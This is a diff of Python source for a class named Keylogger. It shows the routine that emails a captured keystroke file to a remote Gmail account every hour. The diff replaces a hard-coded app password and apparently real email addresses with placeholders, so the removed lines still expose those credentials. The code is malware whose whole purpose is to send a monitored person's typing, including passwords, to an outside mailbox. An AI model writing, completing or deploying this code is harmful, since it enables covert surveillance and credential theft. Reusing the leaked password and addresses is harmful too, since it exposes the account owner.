@@ -26,6 +26,7 @@ class Keylogger:
         # Checks to see if an hour has elapsed
         if (time.perf_counter() - 3600) > current:
 
+            # Changes variable 'current' the current time
             current = time.perf_counter()
 
             # Initialize connection to our gmail server
@@ -33,10 +34,14 @@ class Keylogger:
             smtp.ehlo() 
             smtp.starttls()
 
-            email_password = 'dztd jdgi ytpo ohhf'
-            
+            # Sixteen digit password obtained from two step authentification set up
+            email_password = 'sixteen digit password'
+
+            email_sender = 'email address'
+            email_receiver = 'email adress'
+
             # Login with your email and password 
-            smtp.login('jadencodetest@gmail.com', email_password) 
+            smtp.login(email_sender, email_password) 
             
             def message(subject="", attachment=None): 
                 '''Builds the message and prepares it to be sent.'''
@@ -45,7 +50,7 @@ class Keylogger:
                 msg = MIMEMultipart() 
                 
                 # Adds Subject 
-                msg['Keystrokes'] = subject
+                msg['Subject'] = subject
                     
                 # Checks whether we have the lists of attachments or not! 
                 if type(attachment) is not list: 
@@ -69,14 +74,13 @@ class Keylogger:
             
             
             # Calls the message function 
-            msg = message("key logger", "keyfile.txt") 
+            msg = message("subject", "keyfile.txt") 
             
             # Makes a list of the email or emails to send to 
-            to = ['jadenmcclary@gmail.com'] 
+            to = [email_receiver] 
             
             # Provide some data to the sendmail function! 
-            smtp.sendmail(from_addr="jadencodetest@gmail.com", 
-                        to_addrs=to, msg=msg.as_string()) 
+            smtp.sendmail(from_addr=email_sender, to_addrs=to, msg=msg.as_string()) 
             
             # Closes the connection
             smtp.quit()
